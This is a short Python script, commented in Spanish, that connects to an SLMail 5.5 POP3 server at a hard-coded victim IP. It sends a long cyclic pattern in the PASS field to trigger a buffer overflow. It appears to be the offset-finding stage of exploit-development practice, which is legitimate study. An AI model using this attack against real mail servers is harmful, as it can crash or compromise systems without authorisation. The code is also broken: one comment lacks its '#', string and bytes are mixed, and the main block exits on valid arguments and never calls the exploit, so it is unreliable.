""""
script to fuzz the SLMail 5.5 para buffer overflow

- aqui lo que importa es el tema del tamaño del buffer para el campo de password
- que fue lo que por detras el desarrollador ha fijado para los campos user y password como tamaño de buffer

"""

import socket
import sys

# ====================
# variables
# ====================

IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4"

# ====================
# funciones
# ====================
def exploit():
    # creamos el socket que hace la conexion por TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))

    # recibimos el banner para ver si es SLMail
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")

    # enviamos el comando USER
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")

    # una vez obtenida la respuesta
    # s.send(b"PASS " + b"A" * buffer_length + b"\r\n")
    s.send(b"PASS " + payload + b"\r\n")


    # cerramos la conexion
    s.close()


# ====================
flujo principal
# ====================
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
        exit(1)
